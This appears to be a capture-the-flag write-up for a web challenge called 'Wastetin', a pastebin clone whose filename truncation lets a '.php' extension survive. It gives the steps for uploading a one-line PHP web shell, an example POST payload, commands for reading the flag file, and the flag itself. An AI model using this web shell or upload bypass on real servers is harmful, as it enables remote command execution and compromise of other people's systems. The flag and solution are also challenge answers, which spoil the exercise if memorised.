# Wastetin

## Flavortext

Pastebin Is Passé - Leave Passébin Behind And Use WasteTin In 2018!!1!

## Description

Shitty clone of pastebin.   
Users can enter text, and enter a filename for the text to be saved under (on the server).  

Flag.txt appears to be locked down, and all filenames have .txt appended to them after submission.  
However, filenames are also truncated to 42 characters in length, _after_ ".txt" has been appended...  

## How2pwn

1. Enter sick webshell into the textarea (eg `<?php system($_GET['cmd']); ?>`)
2. Enter a filename which is at least 38 characters long, and ends in ".php"
3. Submit. Your webshell will be uploaded, and the ".txt" extension is truncated in the backend
4. Navigate to the link in the output. Append ?cmd="cat ../../flag.txt" to the URL  
   (one can deduce the location of flag with ?cmd="find / -name ../../flag.txt")
5. The flag should be displayed on the screen.

**Example payload:**  
`'fuck=<?php system($_GET['cmd']); ?>&shit=qwertyuiopasdfghjklzxcvbnm123456789012.php'`  

# Flag 
FLAG{w3bsh3llz_4_d4yz}

